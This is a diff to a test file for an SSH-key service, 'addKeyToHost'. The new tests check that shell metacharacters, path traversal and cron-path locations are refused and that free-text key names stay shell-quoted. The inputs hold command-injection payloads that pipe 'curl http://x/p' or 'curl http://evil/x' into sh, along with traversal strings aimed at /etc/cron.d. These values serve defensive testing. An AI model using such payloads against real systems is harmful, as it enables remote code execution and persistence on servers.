@@ -75,13 +75,21 @@ describe("addKeyToHost", () => {
     await expect(addKeyToHost({ sshKey, connection })).rejects.toThrow();
   });
 
-  it("neutralises a single quote in location instead of letting it close the shell string", async () => {
-    await addKeyToHost({ sshKey, connection, location: ".ssh'; curl http://x/p | sh; echo '" });
+  it("refuses a location carrying shell metacharacters outright", async () => {
+    await expect(addKeyToHost({ sshKey, connection, location: ".ssh'; curl http://x/p | sh; echo '" }))
+      .rejects.toThrow();
+    expect(sshExecCommand).not.toHaveBeenCalled();
+  });
+
+  it("neutralises a single quote in the key name instead of letting it close the shell string", async () => {
+    // The name is free text, so shellQuote is what keeps it one argument.
+    const quoted = { id: "k1", name: "it'; curl http://x/p | sh; echo '" } as any;
+    await addKeyToHost({ sshKey: quoted, connection });
     const { command } = sshExecCommand.mock.calls[0][0] as any;
     // Each embedded quote is escaped (close-quote, escaped quote, reopen-quote)
     // rather than closing the argument, so the whole payload stays inside one
     // shell-quoted string instead of becoming a second command.
-    expect(command).toContain("'.ssh'\\''; curl http://x/p | sh; echo '\\'''");
+    expect(command).toContain("'# it'\\''; curl http://x/p | sh; echo '\\'' Key by Voltius'");
   });
 
   it("throws on a multi-line public key instead of shipping it, and never calls sshExecCommand", async () => {
@@ -104,6 +112,27 @@ describe("addKeyToHost", () => {
     getSecret.mockResolvedValueOnce("* * * * * root curl http://evil/x|sh" as never);
     await expect(addKeyToHost({ sshKey, connection })).rejects.toThrow();
     expect(sshExecCommand).not.toHaveBeenCalled();
+  });
+
+  it("refuses an absolute or escaping location, whichever caller asked for it", async () => {
+    // The MCP schema is not the boundary: api.keys.addToHost passes location and
+    // filename straight through, so the service has to hold.
+    for (const location of ["/etc/cron.d", "/", ".", "..", ".ssh/../../etc"]) {
+      await expect(addKeyToHost({ sshKey, connection, location })).rejects.toThrow();
+    }
+    expect(sshExecCommand).not.toHaveBeenCalled();
+  });
+
+  it("refuses a filename carrying a path separator", async () => {
+    await expect(addKeyToHost({ sshKey, connection, filename: "../../etc/cron.d/x" })).rejects.toThrow();
+    await expect(addKeyToHost({ sshKey, connection, filename: "sub/keys" })).rejects.toThrow();
+    expect(sshExecCommand).not.toHaveBeenCalled();
+  });
+
+  it("still accepts the panel's own defaults and a nested relative location", async () => {
+    await addKeyToHost({ sshKey, connection, location: ".ssh", filename: "authorized_keys" });
+    await addKeyToHost({ sshKey, connection, location: ".ssh/keys.d", filename: "voltius" });
+    expect(sshExecCommand).toHaveBeenCalledTimes(2);
   });
 
   it("quotes $1 in the default script so a glob in location is not expanded", () => {
